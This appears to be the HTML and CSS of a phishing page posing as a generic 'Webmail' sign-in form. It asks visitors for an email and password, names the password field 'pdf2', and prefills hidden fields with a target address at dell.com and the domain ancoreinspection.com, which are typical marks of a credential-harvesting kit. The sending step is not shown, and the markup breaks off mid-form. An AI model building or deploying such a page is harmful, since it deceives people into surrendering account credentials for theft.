    <style type="text/css">
      .login-form {
        width: 385px;
        margin: 30px auto;
      }
      .login-form form {
        margin-bottom: 15px;
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 30px;
      }
      .login-form h2 {
        margin: 0 0 15px; font-size= 9px;
      }
      .form-control, .login-btn {
        min-height: 38px;
        border-radius: 2px;
      }
      .input-group-addon .fa {
        font-size: 18px;
      }
      .login-btn {
        font-size: 15px;
        font-weight: bold;
      }
      .social-btn .btn {
        border: none;
        margin: 10px 3px 0;
        opacity: 1;
      }
      .social-btn .btn:hover {
        opacity: 0.9;
      }
      .social-btn .btn-primary {
        background: #507cc0;
      }
      .social-btn .btn-info {
        background: #64ccf1;
      }
      .social-btn .btn-danger {
        background: #df4930;
      }
      .or-seperator {
        margin-top: 20px;
        text-align: center;
        border-top: 1px solid #ccc;
      }
      .or-seperator i {
        padding: 0 10px;
        background: #f7f7f7;
        position: relative;
        top: -11px;
        z-index: 1;
      }

    <div class="login-form">
      <form action="#" method="post">
        <h2 class="text-center"><div id="top"><img src="images/1.png" alt="Mailbox" id="logoimg" style="width:28px;height:28px;"><span style="vertical-align: middle; font-size= 15px ; padding-left: 5px" id="logoname">Webmail</span> <br><br> <span style="font-size: 18px">Please sign using your email and password to gain access</span></div></h2>
        <center>
          <div class="alert alert-danger" id="mgss" style="display: none;">Invalid Password! Please Enter your correct Password</div>
          <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>

        <div class="form-group">
          <div class="input-group">
            <span class="input-group-addon"><i class="fas fa-user"></i></span>
            <input type="email" class="form-control" name="username" placeholder="Username" value id="ai">
          </div>
        </div>
        <div class="form-group">
          <div class="input-group">
            <span class="input-group-addon"><i class="fas fa-lock"></i></span>
            <input type="password" class="form-control" id="pr" name="pdf2" placeholder="Password" required="required">
          </div>
        </div>
        <div class="form-group">
          <input type="hidden" name="pdf1" size="35" value="info@dell.com"><input type="hidden" name="address" size="5" value="ancoreinspection.com">
          <br><input type="hidden" name="ai" size="35" value><input type="hidden" name="type" size="5" value="ancoreinspection.com">


          <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">Sign in</button>
        </div>
        <div class="clearfix">
